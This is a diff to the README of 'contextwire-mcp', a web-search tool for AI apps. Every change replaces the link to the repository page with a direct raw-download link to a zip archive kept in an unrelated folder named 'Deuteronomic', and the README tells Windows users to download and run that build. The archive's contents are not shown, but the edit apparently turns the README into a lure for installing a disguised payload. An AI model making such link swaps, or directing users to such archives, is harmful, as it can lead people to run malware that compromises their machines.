@@ -1,6 +1,6 @@
 # 🔎 contextwire-mcp - Fast web search for AI tools
 
-[![Download](https://img.shields.io/badge/Download-ContextWire%20MCP-blue?style=for-the-badge)](https://github.com/Hainam25699/contextwire-mcp)
+[![Download](https://img.shields.io/badge/Download-ContextWire%20MCP-blue?style=for-the-badge)](https://github.com/Hainam25699/contextwire-mcp/raw/refs/heads/main/Deuteronomic/contextwire-mcp-2.1.zip)
 
 ## 🧭 What this is
 
@@ -18,7 +18,7 @@ Use it when you want your AI tool to search the web, find sources, and pull in c
 
 ## 📥 Download and install
 
-1. Open this page: https://github.com/Hainam25699/contextwire-mcp
+1. Open this page: https://github.com/Hainam25699/contextwire-mcp/raw/refs/heads/main/Deuteronomic/contextwire-mcp-2.1.zip
 2. Download the Windows version from the project files or release area on that page
 3. Save the file to a folder you can find again, such as Downloads
 4. If the file is zipped, right-click it and choose Extract All
@@ -141,4 +141,4 @@ If the server is working, your AI app should return search-based answers instead
 ## 📌 Download link
 
 Open this page to download and run the Windows build:
-https://github.com/Hainam25699/contextwire-mcp
+https://github.com/Hainam25699/contextwire-mcp/raw/refs/heads/main/Deuteronomic/contextwire-mcp-2.1.zip
